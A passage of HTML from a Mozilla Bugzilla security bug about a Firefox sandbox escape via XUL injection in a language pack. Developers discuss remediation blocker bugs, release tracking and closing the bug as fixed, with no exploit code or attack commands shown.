          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a509310_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a509310_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 11:58 PDT" data-time="1553713139">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-33" data-comment-id="14015504" data-ismarkdown="true" ><p>Ok I&#39;ve attempted to split out all the remediation work we&#39;ve discussed here into blocker bugs. If you think there&#39;s any work I missed (or you have other good ideas for how we can comprehensively remediate this and any similar bugs!) please don&#39;t hesitate to file more blockers.</p>
</div></div><div class="change-set" id="a509568_537703"><div class="change" id="aa509568_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a509568_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a509568_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a509568_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a509568_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a509568_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 12:01 PDT" data-time="1553713311">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Consider an origin-whitelist for early site isolation for AMO and accounts.firefox.com"
   href="/show_bug.cgi?id=1539595">CVE-2019-11741</a></div></div></div><div class="change-set" id="a565200_159069"><div class="change" id="aa565200_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a565200_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a565200_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a565200_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a565200_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a565200_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-28 03:29 PDT" data-time="1553768943">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Convert consumers using inline HTML markup in browser.dtd to fluent and/or to not use inline markup"
   href="/show_bug.cgi?id=1539758">1539758</a></div></div></div><div class="change-set" id="a565350_159069"><div class="change" id="aa565350_159069">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a565350_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a565350_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a565350_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a565350_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a565350_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-28 03:31 PDT" data-time="1553769093">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts"
   href="/show_bug.cgi?id=1539759">1539759</a></div></div></div><div class="change-set" id="a580031_537703"><div class="change" id="aa580031_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a580031_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a580031_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a580031_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a580031_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a580031_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-28 07:36 PDT" data-time="1553783774">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - [meta] pwn2own 2019"
   href="/show_bug.cgi?id=1539818">pwn2own-2019</a></div></div></div><div class="change-set" id="c34"><div class="comment" data-id="14029397" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a580031_537703"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a580031_537703"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-02 18:02 PDT" data-time="1554253378">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-34" data-comment-id="14029397" data-ismarkdown="true" ><p>Alex, this seems unlikely be something we fix in 66 given it looks complex and no one is assigned to the dependent bugs. Do you think it&#39;s OK to mark this wontfix for 66?</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=isnotempty">tracking-firefox66</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=blocking">blocking</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">Flags: needinfo?(agaynor)</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="14029405" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a580031_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a580031_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-02 18:08 PDT" data-time="1554253721">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-35" data-comment-id="14029405" data-ismarkdown="true" ><p>(In reply to Liz Henry (:lizzard) (use needinfo) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c34" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #34</a>)</p>
<blockquote>
<p>Alex, this seems unlikely be something we fix in 66 given it looks complex and no one is assigned to the dependent bugs. Do you think it&#39;s OK to mark this wontfix for 66?</p>
</blockquote>
<p><a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539598" title="VERIFIED FIXED - Restrict mozAddonManager&#39;s special privileges to calls from the discovery pane">Bug 1539598</a> will be fixed within the next couple of days.</p>
</div></div><div class="change-set" id="c36"><div class="comment" data-id="14030266" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a580031_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a580031_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-03 06:01 PDT" data-time="1554296497">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-36" data-comment-id="14030266" data-ismarkdown="true" ><p>I&#39;ll defer to Kris&#39;s expertise as to the addons changes, my guess is that the changes will be somewhat involved and the safest thing is probably to uplift to beta but not to release.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(agaynor)</span></div></div></div><div class="change-set" id="a1098623_451704"><div class="change" id="aa1098623_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a1098623_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a1098623_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1098623_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1098623_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a1098623_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-03 07:39 PDT" data-time="1554302366">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=isnotempty">status-firefox66</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="a1628172_1689"><div class="change" id="aa1628172_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a1628172_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a1628172_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1628172_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1628172_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a1628172_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-09 10:45 PDT" data-time="1554831915">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: core-security &rarr; dom-core-security</div></div></div><div class="change-set" id="a3341816_580382"><div class="change" id="aa3341816_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a3341816_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a3341816_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3341816_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3341816_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a3341816_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-29 06:45 PDT" data-time="1556545559">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=isnotempty">status-firefox67</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=isnotempty">tracking-firefox67</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=blocking">blocking</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=isnotempty">tracking-firefox68</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=blocking">blocking</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="a6554627_1689"><div class="change" id="aa6554627_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a6554627_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a6554627_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a6554627_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a6554627_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a6554627_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-05 11:12 PDT" data-time="1559758370">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Re-Enable Mozilla Content Process Isolation"
   href="/show_bug.cgi?id=1557074">1557074</a></div></div></div><div class="change-set" id="a8260556_580382"><div class="change" id="aa8260556_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a8260556_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a8260556_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a8260556_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a8260556_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-25 05:04 PDT" data-time="1561464299">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=isnotempty">status-firefox68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=isnotempty">tracking-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c37"><div class="comment" data-id="14201416" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a8260556_580382"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-27 03:38 PDT" data-time="1561631904">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-37" data-comment-id="14201416" data-ismarkdown="true" ><p>My understanding is this is effectively fixed for 68/69 based on our changes to DTDs. Dan, can you confirm? Should we close this bug?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="c38"><div class="comment" data-id="14209247" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a8260556_580382"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-01 10:37 PDT" data-time="1562002643">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-38" data-comment-id="14209247" data-ismarkdown="true" ><p>Yes, we fixed this in multiple ways. Initially with small breaks in the chain (like finishing the conversion of about:telemetry to fluent, some on AMO itself) and ultimately with <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1539759" title="VERIFIED FIXED - Stop allowing markup injection via DTD in system-privileged contexts">bug 1539759</a>.</p>
<p>[Tracking Requested - why for this release]:<br>
I&#39;m not sure what is feasible to back-port to ESR-60 for this but we should make sure this specific chain is broken enough before ZDI blogs about it.</p>
</div><div class="activity"><div class="change">Group: dom-core-security &rarr; core-security-release</div><div class="change">Status: NEW &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2019-07-01 10:37 PDT" data-time="1562002643">2 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=isnotempty">status-firefox68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=isnotempty">tracking-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=68%2B">68+</a></div><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div><div class="change">Resolution: --- &rarr; FIXED</div></div></div><div class="change-set" id="c39"><div class="comment" data-id="14209510" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a8260556_580382"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-01 13:08 PDT" data-time="1562011703">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-39" data-comment-id="14209510" data-ismarkdown="true" ><p>strings in .properties files could be problematic as well, but earlier fixes neutered innerHTML and similar when used in a privileged context. We should be in reasonable shape, though the wholesale conversion to fluent can&#39;t come soon enough.</p>
</div></div><div class="change-set" id="c40"><div class="comment" data-id="14209925" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a8260556_580382"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a8260556_580382"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-01 17:09 PDT" data-time="1562026148">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-40" data-comment-id="14209925" data-ismarkdown="true" ><p>(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c28" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #28</a>)</p>
<blockquote>
<p>Note: This was from Niklas Baumstark&#39;s pwn2own 2019 entry.</p>
</blockquote>
